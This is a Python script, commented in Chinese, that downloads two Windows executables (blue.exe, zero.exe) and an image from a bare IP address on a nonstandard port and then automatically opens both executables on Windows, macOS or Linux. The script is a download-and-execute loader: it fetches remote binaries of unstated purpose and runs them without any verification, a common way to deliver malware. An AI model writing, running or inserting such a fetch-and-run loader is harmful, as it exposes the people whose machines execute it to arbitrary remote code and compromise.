import time
import os
import sys
import requests

# 定义要下载的文件 URL 和保存路径
urls = [
    "http://222.187.238.119:30774/files/blue.exe",  # 第一个 URL
    "http://222.187.238.119:30774/files/zero.exe",  # 第二个 URL
    "http://222.187.238.119:30774/files/tea.jpg"

]

# 获取脚本所在的目录
script_dir = os.path.dirname(os.path.abspath(__file__))
output_dir = script_dir

# 创建保存目录（如果不存在）
os.makedirs(output_dir, exist_ok=True)

# 下载文件
for url in urls:
    print(f"正在下载: {url}")
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()
        file_name = os.path.basename(url)
        file_path = os.path.join(output_dir, file_name)
        with open(file_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        print(f"下载成功: {file_name}")
    except Exception as e:
        print(f"下载失败: {url}. 错误: {e}")

# 下载完成后等待3秒
print("所有文件下载完成，等待3秒后打开前两个文件...")
time.sleep(3)

# 打开前两个下载的文件
for i in range(2):
    url = urls[i]
    file_name = os.path.basename(url)
    file_path = os.path.join(output_dir, file_name)
    if os.path.isfile(file_path):
        print(f"正在打开: {file_path}")
        try:
            if os.name == 'nt':
                os.startfile(file_path)
            elif sys.platform.startswith('darwin'):
                os.system(f'open "{file_path}"')
            elif os.name == 'posix':
                os.system(f'xdg-open "{file_path}"')
            else:
                print("不支持的操作系统")
        except Exception as e:
            print(f"无法打开文件: {file_path}. 错误: {e}")
    else:
        print(f"文件不存在: {file_path}")

print("已完成所有操作。")